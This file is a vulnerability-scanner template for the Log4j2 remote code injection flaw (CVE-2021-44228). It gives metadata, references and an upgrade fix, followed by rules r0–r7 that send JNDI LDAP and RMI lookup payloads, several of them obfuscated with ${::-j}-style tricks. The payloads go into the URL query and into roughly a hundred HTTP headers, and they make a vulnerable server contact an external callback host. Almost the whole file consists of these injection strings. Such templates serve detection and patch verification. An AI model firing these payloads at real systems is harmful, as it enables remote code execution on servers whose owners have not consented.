id: CVE-2021-44228

info:
  name: Apache Log4j2 Remote Code Injection
  author: melbadry9,dhiyaneshDK,daffainfo,anon-artist,0xceba,Tea,j4vaovo,NLEG
  severity: critical
  verified: true
  description: |
    Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
  reference:
    - https://logging.apache.org/log4j/2.x/security.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
  solutions: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
  tags: cve,cve2021,rce,oast,log4j,injection,kev
  created: 2023/07/02

set:
  reverse: newJNDI()
  jndiURL: reverse.url.host + reverse.url.path
rules:
  r0:
    request:
      method: GET
      path: /?x=${jndi:ldap://{{jndiURL}}}
    expression: reverse.jndi(5)
  r1:
    request:
      method: GET
      path: /?x=${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
    expression: reverse.jndi(5)
  r2:
    request:
      method: GET
      path: /?x=${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
    expression: reverse.jndi(5)
  r3:
    request:
      method: GET
      path: /?x=${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
    expression: reverse.jndi(5)
  r4:
    request:
      method: GET
      path: /
      headers:
        Accept: application/xml, application/json, text/plain, text/html, */${jndi:ldap://{{jndiURL}}}
        Accept-Charset: ${jndi:ldap://{{jndiURL}}}
        Accept-Datetime: ${jndi:ldap://{{jndiURL}}}
        Accept-Encoding: ${jndi:ldap://{{jndiURL}}}
        Accept-Language: ${jndi:ldap://{{jndiURL}}}
        Ali-CDN-Real-IP: ${jndi:ldap://{{jndiURL}}}
        Authentication: Basic ${jndi:ldap://{{jndiURL}}}
        Authentication: Bearer ${jndi:ldap://{{jndiURL}}}
        Cache-Control: ${jndi:ldap://{{jndiURL}}}
        Cdn-Real-Ip: ${jndi:ldap://{{jndiURL}}}
        Cdn-Src-Ip: ${jndi:ldap://{{jndiURL}}}
        CF-Connecting-IP: ${jndi:ldap://{{jndiURL}}}
        Client-IP: ${jndi:ldap://{{jndiURL}}}
        Contact: ${jndi:ldap://{{jndiURL}}}
        Cookie: ${jndi:ldap://{{jndiURL}}}
        DNT: ${jndi:ldap://{{jndiURL}}}
        Fastly-Client-Ip: ${jndi:ldap://{{jndiURL}}}
        Forwarded-For-Ip: ${jndi:ldap://{{jndiURL}}}
        Forwarded-For: ${jndi:ldap://{{jndiURL}}}
        Forwarded: ${jndi:ldap://{{jndiURL}}}
        Forwarded-Proto: ${jndi:ldap://{{jndiURL}}}
        From: ${jndi:ldap://{{jndiURL}}}
        If-Modified-Since: ${jndi:ldap://{{jndiURL}}}
        Max-Forwards: ${jndi:ldap://{{jndiURL}}}
        Originating-Ip: ${jndi:ldap://{{jndiURL}}}
        Origin: ${jndi:ldap://{{jndiURL}}}
        Pragma: ${jndi:ldap://{{jndiURL}}}
        Proxy-Client-IP: ${jndi:ldap://{{jndiURL}}}
        Proxy: ${jndi:ldap://{{jndiURL}}}
        Referer: ${jndi:ldap://{{jndiURL}}}
        TE: ${jndi:ldap://{{jndiURL}}}
        True-Client-Ip: ${jndi:ldap://{{jndiURL}}}
        True-Client-IP: ${jndi:ldap://{{jndiURL}}}
        Upgrade: ${jndi:ldap://{{jndiURL}}}
        User-Agent: ${jndi:ldap://{{jndiURL}}}
        Via: ${jndi:ldap://{{jndiURL}}}
        Warning: ${jndi:ldap://{{jndiURL}}}
        WL-Proxy-Client-IP: ${jndi:ldap://{{jndiURL}}}
        X-Api-Version: ${jndi:ldap://{{jndiURL}}}
        X-Att-Deviceid: ${jndi:ldap://{{jndiURL}}}
        X-ATT-DeviceId: ${jndi:ldap://{{jndiURL}}}
        X-Client-IP: ${jndi:ldap://{{jndiURL}}}
        X-Client-Ip: ${jndi:ldap://{{jndiURL}}}
        X-Client-IP: ${jndi:ldap://{{jndiURL}}}
        X-Cluster-Client-IP: ${jndi:ldap://{{jndiURL}}}
        X-Correlation-ID: ${jndi:ldap://{{jndiURL}}}
        X-Csrf-Token: ${jndi:ldap://{{jndiURL}}}
        X-CSRFToken: ${jndi:ldap://{{jndiURL}}}
        X-Do-Not-Track: ${jndi:ldap://{{jndiURL}}}
        X-Foo-Bar: ${jndi:ldap://{{jndiURL}}}
        X-Foo: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded-By: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded-For-Original: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded-For: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded-Host: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded-Port: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded-Protocol: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded-Proto: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded-Scheme: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded-Server: ${jndi:ldap://{{jndiURL}}}
        X-Forwarded-Ssl: ${jndi:ldap://{{jndiURL}}}
        X-Forwarder-For: ${jndi:ldap://{{jndiURL}}}
        X-Forward-For: ${jndi:ldap://{{jndiURL}}}
        X-Forward-Proto: ${jndi:ldap://{{jndiURL}}}
        X-Frame-Options: ${jndi:ldap://{{jndiURL}}}
        X-From: ${jndi:ldap://{{jndiURL}}}
        X-Geoip-Country: ${jndi:ldap://{{jndiURL}}}
        X-Host: ${jndi:ldap://{{jndiURL}}}
        X-Http-Destinationurl: ${jndi:ldap://{{jndiURL}}}
        X-Http-Host-Override: ${jndi:ldap://{{jndiURL}}}
        X-Http-Method-Override: ${jndi:ldap://{{jndiURL}}}
        X-HTTP-Method-Override: ${jndi:ldap://{{jndiURL}}}
        X-Http-Method: ${jndi:ldap://{{jndiURL}}}
        X-Http-Path-Override: ${jndi:ldap://{{jndiURL}}}
        X-Https: ${jndi:ldap://{{jndiURL}}}
        X-Htx-Agent: ${jndi:ldap://{{jndiURL}}}
        X-Hub-Signature: ${jndi:ldap://{{jndiURL}}}
        X-If-Unmodified-Since: ${jndi:ldap://{{jndiURL}}}
        X-Imbo-Test-Config: ${jndi:ldap://{{jndiURL}}}
        X-Insight: ${jndi:ldap://{{jndiURL}}}
        X-Ip: ${jndi:ldap://{{jndiURL}}}
        X-Ip-Trail: ${jndi:ldap://{{jndiURL}}}
        X-Leakix: ${jndi:ldap://{{jndiURL}}}
        X-Original-URL: ${jndi:ldap://{{jndiURL}}}
        X-Originating-IP: ${jndi:ldap://{{jndiURL}}}
        X-ProxyUser-Ip: ${jndi:ldap://{{jndiURL}}}
        X-Real-Ip: ${jndi:ldap://{{jndiURL}}}
        X-Remote-Addr: ${jndi:ldap://{{jndiURL}}}
        X-Remote-IP: ${jndi:ldap://{{jndiURL}}}
        X-Requested-With: ${jndi:ldap://{{jndiURL}}}
        X-Request-ID: ${jndi:ldap://{{jndiURL}}}
        X-True-IP: ${jndi:ldap://{{jndiURL}}}
        X-UIDH: ${jndi:ldap://{{jndiURL}}}
        X-Wap-Profile: ${jndi:ldap://{{jndiURL}}}
        X-WAP-Profile: ${jndi:ldap://{{jndiURL}}}
        X-XSRF-TOKEN: ${jndi:ldap://{{jndiURL}}}
    expression: reverse.jndi(5)
  r5:
    request:
      method: GET
      path: /
      headers:
        Accept-Charset: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Accept-Datetime: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Accept-Encoding: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Accept-Language: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Ali-CDN-Real-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Authorization: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Cache-Control: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Cdn-Real-Ip: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Cdn-Src-Ip: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        CF-Connecting-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Client-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Contact: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Cookie: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        DNT: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Fastly-Client-Ip: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Forwarded-For-Ip: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Forwarded-For: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Forwarded: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Forwarded-Proto: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        From: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        If-Modified-Since: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Max-Forwards: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Originating-Ip: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Origin: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Pragma: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Proxy-Client-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Proxy: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Referer: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        TE: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        True-Client-Ip: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        True-Client-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Upgrade: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        User-Agent: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Via: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        Warning: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        WL-Proxy-Client-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Api-Version: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Att-Deviceid: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-ATT-DeviceId: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Client-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Client-Ip: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Client-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Cluster-Client-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Correlation-ID: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Csrf-Token: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-CSRFToken: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Do-Not-Track: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Foo-Bar: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Foo: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded-By: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded-For-Original: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded-For: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded-Host: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded-Port: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded-Protocol: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded-Proto: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded-Scheme: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded-Server: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarded-Ssl: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forwarder-For: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forward-For: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Forward-Proto: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Frame-Options: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-From: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Geoip-Country: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Host: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Http-Destinationurl: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Http-Host-Override: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Http-Method-Override: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-HTTP-Method-Override: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Http-Method: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Http-Path-Override: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Https: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Htx-Agent: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Hub-Signature: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-If-Unmodified-Since: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Imbo-Test-Config: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Insight: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Ip: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Ip-Trail: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Leakix: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Original-URL: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Originating-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-ProxyUser-Ip: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Real-Ip: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Remote-Addr: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Remote-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Requested-With: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Request-ID: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-True-IP: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-UIDH: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-Wap-Profile: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-WAP-Profile: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
        X-XSRF-TOKEN: ${jndi:ldap:${::-/}${::-/}{{jndiURL}}}
    expression: reverse.jndi(5)
  r6:
    request:
      method: GET
      path: /
      headers:
        Accept-Charset: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Accept-Datetime: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Accept-Encoding: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Accept-Language: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Ali-CDN-Real-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Authorization: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Cache-Control: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Cdn-Real-Ip: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Cdn-Src-Ip: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        CF-Connecting-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Client-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Contact: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Cookie: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        DNT: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Fastly-Client-Ip: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Forwarded-For-Ip: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Forwarded-For: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Forwarded: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Forwarded-Proto: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        From: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        If-Modified-Since: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Max-Forwards: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Originating-Ip: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Origin: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Pragma: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Proxy-Client-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Proxy: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Referer: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        TE: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        True-Client-Ip: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        True-Client-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Upgrade: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        User-Agent: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Via: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        Warning: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        WL-Proxy-Client-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Api-Version: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Att-Deviceid: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-ATT-DeviceId: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Client-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Client-Ip: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Client-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Cluster-Client-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Correlation-ID: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Csrf-Token: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-CSRFToken: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Do-Not-Track: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Foo-Bar: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Foo: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-By: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-For-Original: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-For: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Host: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Port: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Protocol: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Proto: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Scheme: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Server: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarded-Ssl: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forwarder-For: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forward-For: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Forward-Proto: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Frame-Options: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-From: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Geoip-Country: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Host: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Http-Destinationurl: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Http-Host-Override: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Http-Method-Override: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-HTTP-Method-Override: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Http-Method: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Http-Path-Override: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Https: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Htx-Agent: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Hub-Signature: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-If-Unmodified-Since: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Imbo-Test-Config: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Insight: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Ip: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Ip-Trail: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Leakix: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Original-URL: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Originating-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-ProxyUser-Ip: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Real-Ip: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Remote-Addr: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Remote-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Requested-With: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Request-ID: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-True-IP: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-UIDH: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-Wap-Profile: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-WAP-Profile: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
        X-XSRF-TOKEN: ${${X::-j}ndi:rmi:${::-/}${X::-/}{{jndiURL}}}
    expression: reverse.jndi(5)
  r7:
    request:
      method: GET
      path: /
      headers:
        Accept-Charset: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Accept-Datetime: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Accept-Encoding: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Accept-Language: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Ali-CDN-Real-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Authorization: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Cache-Control: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Cdn-Real-Ip: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Cdn-Src-Ip: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        CF-Connecting-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Client-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Contact: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Cookie: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        DNT: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Fastly-Client-Ip: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Forwarded-For-Ip: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Forwarded-For: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Forwarded: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Forwarded-Proto: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        From: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        If-Modified-Since: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Max-Forwards: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Originating-Ip: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Origin: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Pragma: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Proxy-Client-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Proxy: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Referer: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        TE: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        True-Client-Ip: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        True-Client-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Upgrade: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        User-Agent: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Via: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        Warning: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        WL-Proxy-Client-IP: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Api-Version: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
        X-Att-Deviceid: ${XXX:${${X::-jn}${X::-di}:${X::-l}d${X::-a}p:${X::-/}${X::-/}{{jndiURL}}}
